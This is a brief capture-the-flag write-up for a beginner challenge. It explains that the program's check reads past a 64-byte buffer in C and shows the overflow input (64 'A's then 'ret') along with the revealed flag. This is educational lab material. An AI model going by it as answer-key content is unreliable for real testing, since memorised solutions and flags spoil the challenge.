# Katipwnan Buffer Bomber

The challenge starts with this in the terminal:
```
Bomb is 64 in size and 'ret' is the ending command to fire, also this is not valorant...
Plant the spike:
```
<br>
The logic below can be found on the main function of the source code:<br>

```c
if (buf[64] == 'r' && buf[65] == 'e' && buf[66] == 't') {
        printf("All right!\nHere is your flag: ");
        get_flag();
    } else {
        printf("Try again!\n");
    }
```
<br>
Taking into account that this is a c source code, accessing array elements do not undergo bounds-checking. Meaning that even though the buffer is only 64 in size, 
it is possible to create a string beyond 64 characters. The flag will be outputted as long as r', 'e' and 't', are in indeces 64, 65, and 66, respectively. This can be done by 
inputting random characters for the first 64 bytes and then input 'r', 'e' and 't'.<br><br>

```
Bomb is 64 in size and 'ret' is the ending command to fire, also this is not valorant...
Plant the spike: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAret
All right!
Here is your flag: CITU{k4tipwn4n_0v3rfl0w_b0mb_4ctiv4t3d_BO000000M!!}
'''
